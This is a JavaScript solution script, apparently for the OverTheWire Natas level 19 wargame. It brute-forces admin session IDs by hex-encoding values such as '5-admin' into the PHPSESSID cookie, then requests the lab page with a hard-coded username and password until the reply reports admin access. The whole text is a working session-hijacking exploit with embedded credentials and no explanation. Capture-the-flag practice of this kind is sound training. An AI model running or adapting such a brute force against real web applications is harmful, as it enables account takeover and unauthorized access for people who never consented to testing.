function ascii_to_hexa(str)
  {
	var arr1 = [];
	for (var n = 0, l = str.length; n < l; n ++) 
     {
		var hex = Number(str.charCodeAt(n)).toString(16);
		arr1.push(hex);
	 }
	return arr1.join('');
   }

let fl=0;
for(let i=0;i<=640;i++)
{
	let value=i+"-admin";
	let url = "http://natas19.natas.labs.overthewire.org/";
	document.cookie="PHPSESSID="+ascii_to_hexa(value);
	let xhr = new XMLHttpRequest();
	xhr.open('GET',url,false,"natas19","4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs");
	xhr.onload = function(){
		if(xhr.status!=200)
		{
			console.log("Error");
		}
		else
		{
			console.log(document.cookie);
			//console.log(xhr.response);
			if((xhr.response).includes("You are an admin"))
			{
				console.log(xhr.response);
				fl=1;
			}
			document.cookie = "PHPSESSID="+ascii_to_hexa(value)+"; expires=Thu, 01 Jan 1970 00:00:00 UTC"; //deletes the cookie
		}
	}

	xhr.onerror = function(){
		console.log("Request failed");
	}

	xhr.send();

	if(fl) break;
}
